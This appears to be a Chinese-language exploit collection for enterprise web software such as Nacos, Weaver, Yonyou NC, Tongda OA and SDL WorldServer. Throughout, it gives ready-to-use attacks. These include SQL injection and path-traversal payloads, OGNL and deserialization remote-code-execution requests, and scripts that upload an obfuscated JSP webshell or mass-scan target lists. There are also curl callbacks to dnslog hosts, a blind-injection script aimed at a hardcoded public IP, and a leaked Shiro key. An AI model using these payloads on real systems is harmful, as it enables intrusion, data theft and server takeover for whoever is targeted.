        - https://mp.weixin.qq.com/s/arBSXR1uyfMT4UEr16Yw-A
```

## Nacos SQL注入漏洞

```
# 查询用户列表：
/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20
# 从CONFIG.INFO读取config信息，翻密码。
/nacos/v1/cs/ops/derby?sql=select+*+from+CONFIG_INFO+st

# 以下语句可以查询数据库中所有信息：
select * from users
select * from permissions
select * from roles
select * from tenant_info
select * from tenant_capacity
select * from group_capacity
select * from config_tags_relation
select * from app_configdata_relation_pubs
select * from app_configdata_relation_subs
select * from app_list
select * from config_info_aggr
select * from config_info_tag
select * from config_info_beta
select * from his_config_info
select * from config_info
```

## 若依管理系统后台任意文件读取漏洞CNVD-2021-15555

```
/common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd
# 读java进程信息。
/common/download/resource?
resource=/profile/../../../../../../../../../../../../../../proc/sched_debug
# 读shiro key
/common/download/resource?
resource=/profile/../../../../../../../../../../../../../../home/tongweb7/deploymen
t/zzadmin/WEB-INF/classes/application.yml
```

##  Netgear 多款设备 boardDataWW.php 文件命令执行漏洞 

```
# 未授权访问/boardDataWW.php页面。
# 输入框中输入：1111222233333;id>test.txt#
# 访问/test.txt查看命令执行结果。
POST /boardDataWW.php HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded

macAddress=112233445566%3Bwget+http%3A%2F%2Fnstucl.dnslog.cn%23&reginfo=0&writeData=Submit
```

https://www.cnblogs.com/VxerLee/p/16434463.html

## 泛微E-Mobile Ognl 表达式注入

```
# 登录页面：
http://6.6.6.6/login.do?
or
http://6.6.6.6/login/login.do?

# 测试：/login.do?message=66*66*66-66666
# exp(可以post请求):
message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
```

https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.sh0w.top/_index_php_archives_14_/index.html

## 泛微OA weaver.common.Ctrl 任意文件上传漏洞

```
import zipfile
import random
import sys
import requests
def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str
mm = generate_random_str(8)
webshell_name1 = mm+'.jsp'
webshell_name2 = '../../../'+webshell_name1
def file_zip():
    shell = """<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%
    if(request.getParameter("cmd")!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
                        Object[]{}), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("
<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
    """   ## 替换shell内容
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)
def GetShell(urllist):
    file_zip()
    print('上传文件中')
    urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
    file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
    requests.post(url=urls,files=file,timeout=60, verify=False)
    GetShellurl = urllist+'/cloudstore/'+webshell_name1
    GetShelllist = requests.get(url = GetShellurl)
    if GetShelllist.status_code == 200:
        print('利用成功webshell地址为:'+GetShellurl)
    else:
        print('未找到webshell利用失败')
def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        GetShell(url)
    else:
        print("python3 poc.py http://xx.xx.xx.xx")
if __name__ == '__main__':
    main()
```

## Casdoor单点登录系统SQL注入CVE-2022-24124

```
GET /api/get-organizations?p=123&pageSize=123&value=cfx&sortField&sortOrder&field=updatexml(null,version(),null) HTTP/1.1 
Host: {hostname} 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
Accept-Encoding: gzip, deflate DNT: 1 
Connection: close 
Upgrade-Insecure-Requests: 1
```

## 用友 NC 6.5版本 FileReceiveServlet 路由任意文件上传漏洞

```
import requests
import threadpool
import urllib3
import sys
import argparse
urllib3.disable_warnings()

proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://google.com",
}
def multithreading(funcname, filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl
def exp(u):
    uploadHeader = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Content-Type": "multipart/form-data;",
        "Referer": "https://google.com"
    }
    uploadData = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
    shellFlag = "t0test0ls"
    uploadData += shellFlag
    try:
        req1 = requests.post(u + "/servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData,
                             timeout=25)
        if req1.status_code == 200:
            req3 = requests.get(u + "/t00ls.jsp", headers=header, verify=False, timeout=25)
            if req3.text.index(shellFlag) >= 0:
                printFlag = "[Getshell]" + u + "/t00ls.jsp" + "\n"
                print(printFlag)
                wirte_targets(printFlag, "vuln.txt")
    except:
        pass
    # print(printFlag, end="")
if __name__ == "__main__":
    if (len(sys.argv)) < 2:
        print('useage : python' + str(sys.argv[0]) + ' -h')
    else:
        parser = argparse.ArgumentParser()
        parser.description = 'YONYOU UC 6.5 FILE UPLOAD!'
        parser.add_argument('-u', help="url -> example [url]http://127.0.0.1[/url]", type=str, dest='check_url')
        parser.add_argument('-r', help="url list to file", type=str, dest='check_file')
        args = parser.parse_args()
        if args.check_url:
            exp(args.check_url)
        if (args.check_file):
            multithreading(exp, args.check_file, 8)
```

## 迅睿CMS XUNRUICMS 4.5.0版本 api_related_html 远程代码执行漏洞

```
/index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid=%20action=function%20name=phpinfo%20param0=-1

/index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid=%20action=function%20name=system%20param0=calc
```

https://xz.aliyun.com/t/10002

## 通达2017OA前台SQL注入 获取session

```
POST /general/document/index.php/recv/register/insert HTTP/1.1
Host:
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77
Safari/537.36
Content-Type:application/x-www-form-urlencoded
Accept-Encoding: gzip

title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=

# -*- coding:utf-8 -*-
import requests
def hello(url, payload):
    result = ""
    payload_bak = payload
    for len in range(1, 27):
        str = '0'
        for i in range(0, 7):
            payload = payload.format(len, 6 - i, int(str + '0', 2))
            data = {payload: "1", "_SERVER": ""}
            r = requests.post(url, data=data, timeout=10, verify=False, allow_redirects=False)
            # print(r.status_code)
            if r.status_code == 302:
                str = str + '0'
            elif r.status_code == 500:
                str = str + '1'
            else:
                hello(url, payload)
            payload = payload_bak
        result += chr(int(str, 2))
        if int(str, 2) == 127:
            print("系统当前无正在登录的用户...")
            return result
        print("第%d位为: %s" % (len, chr(int(str, 2))))
    return result
def main():
    url = "http://60.190.185.74:88/general/document/index.php/recv/register/insert"
    payload = """title)values("'"^exp(if((ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/1),{},1))>>{}={}),1,710)))# """
    print("PHPSESSID=%s" % hello(url, payload))
if __name__ == "__main__":
    main()
```

## 通达OA general/score/flow/scoredate/result.php接口存在SQL注入漏洞

```
/general/score/flow/scoredate/result.php?FLOW_ID=11%BF%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),md5(654321),1,1)a%20from%20information_schema.tables%20group%20by%20a)b)%23
```

## iKuai OS (post-auth) 后台 RCE

```
'''
Description: ikuai8_3.6.x RCE vulnerability after login.
Author: eqqie
Other: Bypass IKSH to execute arbitrary BASH commands.
''' 

import requests
import base64
import hashlib
import json
import sys

host = "192.168.10.1"
username = "admin"
password = "qwe123!@#"
command = "cat /etc/passwd"

login_form = {"username": "", "passwd": "",
              "pass": "", "remember_password": "true"}


def main(host, user, passwd, cmd):
    login_form["username"] = user
    login_form["passwd"] = hashlib.md5(passwd.encode()).hexdigest()
    login_form["pass"] = base64.b64encode(
        b"salt_11"+password.encode()).decode()
    session = requests.Session()
    print(f"[*] Login with '{user}:{passwd}'\n")
    res = session.post(
        url=f"http://{host}/Action/login",
        data=json.dumps(login_form),
        timeout=(3, 3)
    )
    if res.json()["Result"] != 10000:
        raise ValueError("Login fail!")
    print("[*] Run command:", cmd, "\n")
    res = session.post(
        url=f"http://{host}/Action/proxy?http://127.0.0.1:34567/command/file",
        data=cmd,
        timeout=(3, 3)
    )
    print("[*] Exec result:\n")
    print(res.text)


if __name__ == "__main__":
    if len(sys.argv) != 5:
        main(host, username, password, command)
    else:
        main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
```

https://github.com/yikesoftware/exp_and_poc_archive/tree/main/CVE/CVE-2022-40469

## 用友NC Cloud soapFormat.ajax接口存在XXE

https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver

```
POST /uapws/soapFormat.ajax HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 259

msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
```

## CVE-2022-34267 SDL WorldServer 身份认证绕过RCE

```
# 添加管理员用户：
/ws-legacy/services/UserWSUserManager?method=createUser_&username=testuser&password=testuser@qaz123&firstName=luis&lastName=ladon&userType=Administrator&token=2
# 或者：

POST /ws-legacy/services/UserWSUserManager HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5763.212 Safari/537.36 OPR/98.0.4728.119
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=A440950C0CE03EBC83A30F926F0FC3E3
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Content-Length: 856

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:com="http://www.idiominc.org/com.idiominc.webservices.UserWSUserManager">
   <soapenv:Header/>
   <soapenv:Body>
      <com:createUser_ soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <token xsi:type="xsd:string">2</token>
         <username xsi:type="xsd:string">testuser</username>
         <password xsi:type="xsd:string">testuser@qaz123</password>
         <firstName xsi:type="xsd:string">luis</firstName>
         <lastName xsi:type="xsd:string">ladon</lastName>
         <userType xsi:type="xsd:string">Administrator</userType>
      </com:createUser_>
   </soapenv:Body>
</soapenv:Envelope>

# 上传jar文件，上传表单：
</!DOCTYPE html>
<html>
<head>
    <title>file upload</title>
</head>
<body>
<h2>hello</h2>
    <form  action="http://xxx.xxx.xxx/ws-api/v2/customizations/api?token=02" method="post" enctype="multipart/form-data">
        <input type="file" name="file"/>
        <input type="submit" value="Submit" />
    </form>
</body>
</html>
```

## CVE-2022-34268 SDL WroldServer 反序列化RCE

https://mp.weixin.qq.com/s/mGTX2uHvKCLWQ0WiYDmikQ

```
# 1.使用ysoserial生成序列化数据
java -jar ysoserial-all.jar CommonsCollections1 "curl 97c2a13451.ipv6.1433.eu.org" > poc.bin
# 2.向目标发送序列化数据
curl --data-binary @poc.bin http://xxx.xxx.xxx/ws-legacy/clientLogin -H "Content-Type: application/x-java-serialized-object"
```

## CVE-2022-34269 SDL WroldServer SSRF

```
# 1.创建新的服务
/ws-legacy/load_dtd?system_id=http%3a//127.0.0.1%3a8080/ws-legacy/services/AdminService%3fmethod%3d!--%253E%253Cdeployment%2520xmlns%253D%2522http%253A%252F%252Fxml.apache.org%252Faxis%252Fwsdd%252F%2522%2520xmlns%253Ajava%253D%2522http%253A%252F%252Fxml.apache.org%252Faxis%252Fwsdd%252Fproviders%252Fjava%2522%253E%253Cservice%2520name%253D%2522ServiceFactoryService%2522%2520provider%253D%2522java%253ARPC%2522%253E%253Cparameter%2520name%253D%2522className%2522%2520value%253D%2522org.apache.axis.client.ServiceFactory%2522%252F%253E%253Cparameter%2520name%253D%2522allowedMethods%2522%2520value%253D%2522*%2522%252F%253E%253C%252Fservice%253E%253C%252Fdeployment&token=02

# 2.启动LDAP服务
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C 'curl 8e2wrm.dnslog.cn'

# 3.在Burp中发送请求
POST /ws-legacy/services/UserWSUserManager HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5763.212 Safari/537.36 OPR/98.0.4728.119
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=A440950C0CE03EBC83A30F926F0FC3E3
Connection: close
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Content-Length: 856

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:com="http://www.idiominc.org/com.idiominc.webservices.UserWSUserManager">
   <soapenv:Header/>
   <soapenv:Body>
      <cli:getService soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <environment xsi:type="x-:Map" xs:type="type:Map" xmlns:x-="http://xml.apache.org/xml-soap" xmlns:xs="http://www.w3.org/2001/XMLSchema-instance">
             <item xsi:type="x-:mapItem" xs:type="type:mapItem">
                 <key xsi:type="xsd:string">jndiName</key>
                 <value xsi:type="xsd:string">ldap://10.0.0.131:1389/ipgtz4</value>
             </item>
          </environment>
       </cli>                  
   </soapenv:Body>
</soapenv:Envelope>
```

## 铭飞/MCMS shiro 反序列化漏洞 CVE-2022-22928

```
key（AES GCM）: 4AvVhmFLUs0KTA3Kprsdag==
构造链:CommonsBeanutils1  回显方式: AllEcho
```

## 天融信TOPSEC static_convert 远程命令执行漏洞

```
poc:
view/IPV6/naborTable/static_convert.php?blocks[0]=||%20 echo%20%27%3C?php%20phpinfo();?%3E%27%20%3E%3E%20/var/www/html/1.php%0a

Base64版:
/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20 echo%20PD9waHAgcGhwaW5mbygpOz8+%20%7Cbase64%20-d%20%3E%3E%20/var/www/html/1.php%0a
```

## 通达OA 11.5 SQL注入漏洞

```
POST /general/file_folder/swfupload_new.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Referer: http://192.168.202.1/general/meeting/myapply/details.php?affair=true&id=5&nosign=true&reminding=true
X-Resource-Type: xhr
Connection: close
Host: 192.168.77.137
Pragma: no-cache
x-requested-with: XMLHttpRequest
Content-Length: 433
x-wvs-id: Acunetix-Deepscan/186
Cache-Control: no-cache
accept: */*
origin: http://192.168.202.1
Accept-Language: en-US
Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2

------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

0 RLIKE (SELECT  (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))
------------GFioQpMK0vv2--
```

## 铭飞 mcms listExcludeApp sql注入漏洞

```
POST /mdiy/dict/listExcludeApp HTTP/1.1

categoryId=1*
```

https://www.freebuf.com/vuls/345062.html

## 亿华考勤管理系统 任意文件上传漏洞cnvd-2022-50678

```
# fofa：body="/api/shengcheng_img.ashx?a="
# 文件地址为回显地址。
POST /handle/unloadfile.ashx HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors,
Sec-Fetch-Site: same-origin

-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="file"; filename="test.asp"
Content-Type: image/jpeg

test
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="action"

unloadfile
-----------------------------21909179191068471382830692394
Content-Disposition: form-data; name="filepath"

./
-----------------------------21909179191068471382830692394
```

## Ecshop两个SQL注入

```
# 注入1
POST /delete_cart_goods.php HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Content-Type: application/x-www-form-urlencoded

id=0||(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))

# 注入2,需要以普通用户登录。
POST /user.php?act=collection_list HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
X-Forwarded-Host': '45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert(user(),1,1,0x7e),1) and '";|45ea207d7a2b68c49582d2d22adf953a
Cookie:ECS_ID={{ecsid}}
```

## 华天动力OA 8000版 workFlowService SQL注入漏洞

```
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: xx.xx.xx.xx
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0

<buffalo-call> 
<method>getDataListForTree</method> 
<string>select user()</string> 
</buffalo-call>
```

## jeecg-boot queryUserComponentData SQL注入漏洞

```
/jeecg-boot/sys/user/queryUserComponentData?_t=1641263644&pageNo=1&pageSize=10&departId=5159cde220114246b045e574adceafe9&realname=admin&username=%61%64%6d%69%6e%27%20%61%6e%64%20%28%73%65%6c%65%63%74%20%39%33%36%31%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%28%73%6c%65%65%70%28%35%29%29%29%6f%46%78%55%29%2d%2d%20

/jeecg-boot/sys/user/queryUserComponentData?_t=1641263644&pageNo=1&pageSize=10&departId=5159cde220114246b045e574adceafe9&realname=%61%64%6d%69%6e%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%43%4f%4e%43%41%54%28%30%78%37%31%36%61%37%30%36%32%37%31%2c%30%78%37%37%34%63%37%30%34%39%34%61%34%39%35%37%34%64%35%36%35%39%36%63%36%39%35%30%34%66%34%65%35%34%36%32%36%33%35%39%34%35%36%63%36%36%35%61%35%36%35%37%34%38%35%34%35%34%37%61%36%31%37%37%35%37%37%30%34%33%36%39%34%31%36%64%34%61%34%31%36%37%2c%30%78%37%31%36%62%37%31%37%31%37%31%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d%20%2d0&username=zz12
```

https://github.com/jeecgboot/jeecg-boot/issues/3348

## 多个用友反序列化漏洞

```
# 路径。
/service/~baseapp/UploadServlet
/service/ECFileManageServlet
/servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet
/servlet/~ic/nc.bs.framework.mx.MxServlet
/servlet/~uapxbrl/uap.xbrl.persistenceImpl.XbrlPersistenceServlet
/servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet
/servlet/~ic/nc.document.pub.fileSystem.servlet.DownloadServlet
/servlet/~ic/nc.document.pub.fileSystem.servlet.UploadServlet
/servlet/~ic/nc.document.pub.fileSystem.servlet.DeleteServlet
/servlet/~ic/com.ufida.zior.console.ActionHandlerServlet
/ServiceDispatcherServlet
/servlet/~baseapp/nc.message.bs.NCMessageServlet
/fs/update/DownloadServlet
/service/~cc/nc.bs.logging.config.LoggingConfigServlet

# exp
POST /service/~baseapp/UploadServlet HTTP/1.1
Host: your-ip
Cmd: whoami
Content-Type: *
 
{{hexdec(aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000013f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000077372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e000378707672002a6f72672e6d6f7a696c6c612e6a6176617363726970742e446566696e696e67436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400166765744465636c61726564436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00180000000074000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e0018000000027400024134757200025b42acf317f8060854e0020000787000001751cafebabe00000031016b0a001d00920a004400930a004400940a001d00950800960a001b00970a009800990a0098009a07009b0a0044009c08008c0a0020009d08009e08009f0700a00800a10800a20700a30a001b00a40800a50800a60700a70b001600a80b001600a90800aa0800ab0700ac0a001b00ad0700ae0a00af00b00800b10700b20800b30a007e00b40a002000b50800b609002600b70700b80a002600b90800ba0a007e00bb0a001b00bc0800bd0700be0a001b00bf0800c00700c10800c20800c30a001b00c40700c50a004400c60a00c700bb0800c80a002000c90800ca0a002000cb0800cc0a002000cd0a002000ce0800cf0a002000d00800d109007e00d20a002600d30a002600d409007e00d50700d60a004400d70a004400d808008d0800d90a007e00da0800db0a00dc00dd0a002000de0800df0800e00800e10700e20a005000920a005000e30800e40a005000e50800e60800e70800e80800e90a00ea00eb0a00ea00ec0700ed0a00ee00ef0a005b00f00800f10a005b00f20a005b00f30a005b00f40a00ee00f50a00ee00f60a002f00e50800f70a002000f80800f90a00ea00fa0700fb0a002600fc0a006900fd0a006900ef0a00ee00fe0a006900fe0a006900ff0a010001010a010001020a010301040a010301050500000000000000320a004401060a00ee01070a006901080801090a002f010a08010b08010c0a007e010d07010e01000269700100124c6a6176612f6c616e672f537472696e673b010004706f72740100134c6a6176612f6c616e672f496e74656765723b0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c6501000a457863657074696f6e730100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000765786563757465010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0100046578656301000772657665727365010039284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f496e74656765723b294c6a6176612f6c616e672f537472696e673b01000372756e01000a536f7572636546696c6501000741342e6a6176610c008300840c010f01100c011101120c01130114010007746872656164730c011501160701170c011801190c011a011b0100135b4c6a6176612f6c616e672f5468726561643b0c011c011d0c011e011f010004687474700100067461726765740100126a6176612f6c616e672f52756e6e61626c6501000674686973243001000768616e646c657201001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e0c01200114010006676c6f62616c01000a70726f636573736f727301000e6a6176612f7574696c2f4c6973740c012101220c011a012301000372657101000b676574526573706f6e736501000f6a6176612f6c616e672f436c6173730c012401250100106a6176612f6c616e672f4f626a6563740701260c012701280100096765744865616465720100106a6176612f6c616e672f537472696e67010003636d640c008a008b0c0129012a0100097365745374617475730c012b012c0100116a6176612f6c616e672f496e74656765720c0083012d0100246f72672e6170616368652e746f6d6361742e7574696c2e6275662e427974654368756e6b0c008800890c012e012f01000873657442797465730100025b420c01300125010007646f57726974650100136a6176612f6c616e672f457863657074696f6e0100136a6176612e6e696f2e42797465427566666572010004777261700c013100890100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0c013201330701340100000c01350136010010636f6d6d616e64206e6f74206e756c6c0c0137011d01000523232323230c013801390c013a013b0100013a0c013c013d010022636f6d6d616e64207265766572736520686f737420666f726d6174206572726f72210c007f00800c013e013f0c014001410c008100820100106a6176612f6c616e672f5468726561640c008301420c0143008401000540404040400c008c008b0100076f732e6e616d650701440c0145008b0c0146011d01000377696e01000470696e670100022d6e0100176a6176612f6c616e672f537472696e674275696c6465720c01470148010005202d